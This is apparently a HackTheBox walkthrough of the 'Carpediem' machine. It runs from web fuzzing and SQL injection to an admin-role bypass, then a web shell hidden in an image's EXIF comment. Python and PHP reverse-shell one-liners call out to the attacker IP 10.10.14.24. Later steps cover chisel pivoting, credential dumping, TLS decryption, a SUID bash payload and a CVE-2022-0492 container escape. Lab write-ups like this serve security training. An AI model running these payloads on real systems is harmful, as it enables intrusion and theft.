# HackThBox - Carpediem

## NMAP

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Comming Soon
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80 (HTTP)

Port 80 shows a single page showing a domain name `carpediem.htb`, so let's add this to `hosts` file

<img src="https://i.imgur.com/MqGlYWx.png"/>

<img src="https://i.imgur.com/Ut3qzaB.png"/>

Running a `diresearch` to fuzz for files and directories

<img src="https://i.imgur.com/k9J8Kxy.png"/>

It didn't showed any interesting files so moving to fuzz for subdomain `wfuzz`

```bash
wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://carpediem.htb' -H "Host: FUZZ.carpediem.htb" --hh 2875
```

<img src="https://i.imgur.com/Bb3PyYQ.png"/>

<img src="https://i.imgur.com/D4qZWzJ.png"/>

<img src="https://i.imgur.com/ifbHgWc.png"/>

Fuzzing for files on this subdomain 

```bash
python3 /opt/dirsearch/dirsearch.py -u 'http://portal.carpediem.htb/' -w /opt/SecLists/Discovery/Web-Content/common.txt
```

<img src="https://i.imgur.com/IQKSPSU.png"/>


On visiting any page we can see a GET parameter `s` having a hash value of something

<img src="https://i.imgur.com/BNE6K0f.png"/>

Play around for SQLi it does show that it's vulnerable

<img src="https://i.imgur.com/2ooICss.png"/>

<img src="https://i.imgur.com/tIgmxJT.png"/>

<img src="https://i.imgur.com/mpJtPuw.png"/>

<img src="https://i.imgur.com/DUvLTMu.png"/>

Now dumping the tables

<img src="https://i.imgur.com/ZkCkyl9.png"/>

<img src="https://i.imgur.com/MV7XR7W.png"/>

Database didn't had anythting special other than admin hash which I wasn't able to crack

<img src="https://i.imgur.com/3fhNzDn.png"/>

Check the directories diresarch found for us

<img src="https://i.imgur.com/HL1g7F9.png"/>

Most of them were forbidden except for `/admin`, I tried sqli on login page as well but it doesn't seem that there was sqli there

<Img src="https://i.imgur.com/f2JaWnb.png"/>

Although we can create an account so let's where will it take us

<img src="https://i.imgur.com/eI9XCKo.png"/>

<img src="https://i.imgur.com/NowyXtR.png"/>

We can update account details 

<img src="https://i.imgur.com/ejhO7CT.png"/>

On intercepting the request we can see a POST parameter `login_type` having value set to `2`

<img src="https://i.imgur.com/5tcjkT5.png"/>

I changed it to `1`

<img src="https://i.imgur.com/XSdv4WM.png"/>

This page was also vulnerale to sqli 

<img src="https://i.imgur.com/rfznLRt.png"/>

But now we can access admin panel by changing the login type to 1 which is the admin role

<img src="https://i.imgur.com/Cn3Kaar.png"/>

Visting the user profile we can upload an image file as user avatar

<img src="https://i.imgur.com/yO1pK68.png"/>

Uploading a regular jpeg file it will load the image

<img src="https://i.imgur.com/06DpY2z.png"/>

On uploading php file having system command it won't allow uploading php files and will keep the previous uploaded image

<img src="https://i.imgur.com/mlWdUCv.png"/>

<img src="https://i.imgur.com/cP2CCFm.png"/>


## Foothold

I tried changing the extension name to `.php.jpeg` and `.jpeg.php` but neither of them worked, so I used `exiftool` to add the php code in the `comment` of the image and changed the image extension to php 

```bash
exiftool -Comment='<?php system($_GET['cmd']); ?>' ./image.jpeg

```

<img src="https://i.imgur.com/peqggDa.png"/>

On uploading this php file we'll see that it got uploaded, we can execute this php by checking the source code for the image file name and directory from where it's being loaded

<img src="https://i.imgur.com/EIoHYnP.png"/>

<img src="https://i.imgur.com/gJwLyqL.png"/>

Using the python3 one liner reverse shell

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.24",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

<img src="https://i.imgur.com/hUrIgji.png"/>

We can now stabilize the shell with python3

<img src="https://i.imgur.com/wAN1X2o.png"/>

From classes folder we can find the mysql credentials which maybe useful later

<img src="https://i.imgur.com/ieS9PLj.png"/>

Transerring the nmap static binary we can scan for other docker containers if there are any

<img src="https://i.imgur.com/Yfotw3A.png"/>

<img src="https://i.imgur.com/KKm2iXe.png"/>

To access the services running on these containers we can start a socks proxy server to pivot into these services using `chisel`

On attacker machine

```bash
chisel server -p 8000 --reverse
```

On target machine

```bash
chisel client 10.10.14.32:8000 R:127.0.0.1:socks
```

<img src="https://i.imgur.com/ZqHUqza.png"/>

Make sure to include this line in in `/etc/proxychains.conf`
```
socks5          127.0.0.1 1080
```

<img src="https://i.imgur.com/UgOiqdr.png"/>

After seting this we can access the service running on other containers with `proxychains`

<img src="https://i.imgur.com/2ZAwRDl.png"/>

But we already had dumped the database through sqli, so next we can look at the ftp servcie which was running on 172.17.0.2, we can check if anonmyous user is allowed to login

<img src="https://i.imgur.com/kArvbBS.png"/>

On listing files it shows an error 

<img src="https://i.imgur.com/duQvMCX.png"/>

To avoid this we can change the mode to passive mode which uses an unprivileged port (port > 1024) to be opened on the server

<img src="https://i.imgur.com/mTilktm.png"/>

But still it doesn't show anything, moving onto 172.17.0.4 on which port 27017 is running which is used for mongodb

<img src="https://i.imgur.com/YIth4Ma.png"/>

<img src="https://i.imgur.com/SI3n0Fh.png"/>

<img src="https://i.imgur.com/VWaaQYx.png"/>

All the databaes were empty other than `trudesk`

<img src="https://i.imgur.com/i8TCKVi.png"/>

We can get some credentials from `accounts table` with `db.accounts.find()`

<img src="https://i.imgur.com/yVUgNsR.png"/>

## Privilege Escalation (hflaccus)

From `tickets` table we can read some messages which talks about Security risks of portal to disable admin section portal, changing a username, setting credentails for a new employee , building a cms which is hosted in a container and lastly to fix trudesk api permissions

<img src="https://i.imgur.com/tEwKjdZ.png"/>

<img src="https://i.imgur.com/9uhMWQM.png"/>

<img src="https://i.imgur.com/x25eC3h.png"/>

<img src="https://i.imgur.com/3cAuqPt.png"/>

<img src="https://i.imgur.com/igNTVDQ.png"/>

<img src="https://i.imgur.com/igNTVDQ.png"/>

On googling trudesk, it's an opensource ticketing solution, checking the trudesk api installation page we can see that by default it listens on port 8118

To access this port on browser we can configure firefox with foxyproxy to use socks 

<img src="https://i.imgur.com/wAlxUa1.png"/>

<img src="https://i.imgur.com/vxRmXLo.png"/>

But we don't have the credentials for login, we saw from  the tickets table that a `Zoiper` VoIP is being set for the new employee  `Horace Flaccus`

<img src="https://i.imgur.com/Pec7ev3.png"/>

Checking the port used by Zoiper 

<img src="https://i.imgur.com/vtwBKBj.png"/>

<img src="https://i.imgur.com/0S8DRV1.png"/>

In order to interact with this we need to download the client 

https://www.zoiper.com/en/voip-softphone/download/current

After installing it we'll be presented with a login screen

<img src="https://i.imgur.com/vcki1RZ.png"/>

We can login with `9650` as the username and `2022` as the password

<img src="https://i.imgur.com/vSMiRR9.png"/>

<img src="https://i.imgur.com/GTsdW1c.png"/>

<img src="https://i.imgur.com/smz0EIW.png"/>

<img src="https://i.imgur.com/oKobUdx.png"/>

Now we need to dial `*62` to listen to our voicemail 

<img src="https://i.imgur.com/Ivti35u.png"/>

After dailing the number, it's going to ask us to enter the password which is again `2022` after that, hit `1` to listen for the message which will tell the password for horace flaccus`AuRj4pxq9qPk`

<img src="https://i.imgur.com/n51wAKi.png"/>

Since hflaccus wasn't in the database for trudesk, I tried logging with ssh 

<img src="https://i.imgur.com/rTXUPw4.png"/>

Checking `sudo -l` to see if we can run anything as other user or as root

<img src="https://i.imgur.com/1LPAZyp.png"/>

Next checking for any capabilites it found that capabilites are set on `tcpdump`

<img src="https://i.imgur.com/CQixOTo.png"/>

So using tcpdump we can capture traffic on `docker0` interface and save it into a pcap file

```bash
tcpdump -i docker0 -w uwu.pcap
```

<img src="https://i.imgur.com/x1o4YZz.png"/>

We can transfer this file by running python server on traget machine

<img src="https://i.imgur.com/a7NsrLD.png"/>

Opening this file with `wireshark` we can see https traffic  to `backdrop.carpediem` 
<img src="https://i.imgur.com/3cPqeYm.png"/>

<img src="https://i.imgur.com/DpHnQMF.png"/>

This shows all the traffic is encrypted, if we remeber there was https running on container 172.17.0.2

<img src="https://i.imgur.com/61uobVA.png"/>

<img src="https://i.imgur.com/GiLXQIP.png"/>

<img src="https://i.imgur.com/3HiaBzc.png"/>

But here we need creds so we do need to find the credentials and for that we need to somhow to decrypt the https traffic, we can look for a `.key` file with `find`

<img src="https://i.imgur.com/ofiOyve.png"/>

<img src="https://i.imgur.com/ES1kXvH.png"/>

We can add the key by going into `preferences` -> `protocols` -> `TLS`

<img src="https://i.imgur.com/dp7p6kb.png"/>

And now we can see the http traffic

<img src="https://i.imgur.com/eilDOyO.png"/>

<img src="https://i.imgur.com/2Yfg5qQ.png"/>

Getting the credentials we can login on backdrop cms

<img src="https://i.imgur.com/GMPddQo.png"/>

<img src="https://i.imgur.com/Ryy1liR.png"/>

We can get remote code execution by installing a malicious module, either creating one by analyzing how the module is structutred or just grabbing one from github

https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS

<img src="https://i.imgur.com/Gmkujs8.png"/>

<img src="https://i.imgur.com/ksl08SP.png"/>

<img src="https://i.imgur.com/PXwxV33.png"/>

<img src="https://i.imgur.com/1oX1RhW.png"/>

Start a netcat listener with proxychains, as python and python3 both weren't available we can utilize php to get a reverse shell

```php
php -r '$sock=fsockopen("10.10.14.24",2222);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

<img src="https://i.imgur.com/30YajTi.png"/>

<img src="https://i.imgur.com/nIeQxjL.png"/>

We can stabilize the shell with `script` instead of `python` with 

```bash
script /dev/null -c bash
```

<img src="https://i.imgur.com/TjNQlDm.png"/>

From the running processes we can see `heartbeat.sh` being executed as root

<img src="https://i.imgur.com/ILfWcJh.png"/>

<img src="https://i.imgur.com/765isow.png"/>

In the script, `backdrop.sh` which is being used for making a request to backdrop through command line to the url which will execute `index.php` , so we need to replace that file with our php command

```php
<?php system ('chmod +s /bin/bash') ?>
```

Just replace the index.php file with this

<img src="https://i.imgur.com/dIYQrAT.png"/>

<img src="https://i.imgur.com/ryEtmqa.png"/>

## Privilege Escalation (root)

We got root on the container, to get root on the actual host we need to break out of the container

I edited the shadow file to add a password for root user so I could get an even more better shell 

<img src="https://i.imgur.com/BMW6qfY.png"/>

For breaking out of the container a recent docker escape vulnerability was found related to cgroups dubbed as `CVE-2022-0492`

https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/

There's a test script for this cve if we can breakout of container

https://raw.githubusercontent.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492/main/can-ctr-escape-cve-2022-0492.sh

<img src="https://i.imgur.com/52Beeg8.png"/>

For exploiting it, I found a script on github 

https://github.com/chenaotian/CVE-2022-0492

We can run this exploit by executing commands on the actual host machine

<img src="https://i.imgur.com/PpwlG8a.png"/>

To get a root shell, just make bash a SUID 

<img src="https://i.imgur.com/a7c9E7g.png"/>

<img src="https://i.imgur.com/kdmfuzS.png"/>

## References

- https://book.hacktricks.xyz/pentesting-web/file-upload
- https://stackoverflow.com/questions/24985684/mongodb-show-all-contents-from-all-collections
- https://dzone.com/articles/mongodb-commands-cheat-sheet-for-beginners
- https://www.zoiper.com/en/voip-softphone/download/current
- https://support.f5.com/csp/article/K19310681
- https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS
- https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1
- https://gitlab.com/securitystuffbackup/PoC-in-GitHub
- https://github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492/blob/main/can-ctr-escape-cve-2022-0492.sh
